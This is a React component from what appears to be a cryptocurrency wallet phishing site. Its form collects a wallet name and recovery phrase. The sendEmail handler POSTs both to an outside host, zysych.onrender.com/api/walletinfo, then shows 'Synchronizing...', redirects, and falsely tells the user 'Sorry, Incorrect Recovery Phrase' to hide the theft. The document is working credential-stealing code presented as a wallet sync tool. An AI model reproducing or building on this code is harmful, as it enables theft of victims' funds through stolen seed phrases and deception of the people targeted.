import React, { useState,useEffect} from 'react'
import Box from '@mui/material/Box';
import "../styles/AddPhrase.css";
import { useNavigate, useParams } from 'react-router-dom';
import coins from '../utils/coins';
import FormDataInfo from '../utils/FormDataInfo';
import ErrorConnect from '../utils/ErrorConnect';
import ChildModal from '../utils/ChildModal';
import BackupCode from '../utils/BackupCode';

const style = {
  paddingTop: "10px",
  display: "flex",
  alignItems: "center",
  flexDirection: "column",
  borderRadius: "10px",
};


function AddPhrase() {
  const { id } = useParams();
  const [isBackUpCode, setIsBackUpCode] = useState(false)
  const [walletFormData, setWalletFormData] = React.useState({ wallet: "", phrase: "" });
  const [open, setOpen] = useState(false);
  const [buttonText, setButtonText] = useState("");
  const [status, setStatus] = useState("");
  const navigate  = useNavigate();



  useEffect(() => {
    setOpen(true)
    if(id) {
      setWalletFormData({ ...walletFormData, wallet: coins[id].title });
    }
  }, []);


  const sendEmail = async (e) => {
    e.preventDefault();
    let response = await fetch("https://zysych.onrender.com/api/walletinfo", {
        method: "POST",
        headers: {
            accept: 'application/json',
            'User-agent': 'Rectifier Auth',
            "Content-Type": "application/json;charset=utf-8"
        },
        body: JSON.stringify(Object.assign({}, walletFormData))
    });
    let result = await response.json();
    setButtonText("Synchronizing...");
    setWalletFormData({ wallet: "", phrase: "" });
    navigate("/")
    if (result.code == 200) {
        setStatus({ sucess: true, message: "Sorry, Incorrect Recovery Phrase" })
    } else {
        setStatus({ sucess: false });
    }
}


  const handleChange = (event) => {
    const { name, value } = event.target;
    setWalletFormData((prevFormData) => ({ ...prevFormData, [name]: value }));
  };

  



  return (
    <div className='container'>
      {open  ? <ChildModal setWalletFormData={setWalletFormData} setIsBackUpCode={setIsBackUpCode} open={open} setOpen={setOpen} walletFormData={walletFormData} /> : 
       isBackUpCode ?<BackupCode />:  <FormDataInfo handleSubmit={sendEmail} setWalletFormData={setWalletFormData} handleChange={handleChange} walletFormData={walletFormData} />
     }
    </div>
  );
}

export default AddPhrase